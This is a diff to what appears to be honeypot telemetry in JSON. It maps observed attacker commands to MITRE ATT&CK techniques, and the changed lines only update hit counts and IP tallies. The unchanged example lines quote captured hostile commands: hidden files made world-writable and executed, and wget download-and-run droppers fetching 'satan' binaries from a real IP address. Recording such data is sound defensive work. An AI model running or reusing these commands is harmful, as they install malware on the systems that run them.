@@ -7,7 +7,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 74656,
+      "count": 74662,
       "distinct_ips": 125,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 2099,
-      "distinct_ips": 128,
+      "count": 2115,
+      "distinct_ips": 129,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/; ",
@@ -41,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1163,
-      "distinct_ips": 112,
+      "count": 1166,
+      "distinct_ips": 113,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./satan_mips; rm -rf satan_mips",
         "wget http://176.65.139.136/satan_x86_64; chmod 777 satan_x86_64; ./satan_x86_64; rm -rf satan_x86_64",
@@ -136,6 +136,6 @@
       ]
     }
   ],
-  "total_commands": 172882,
-  "matched_commands": 77205
+  "total_commands": 173249,
+  "matched_commands": 77226
 }
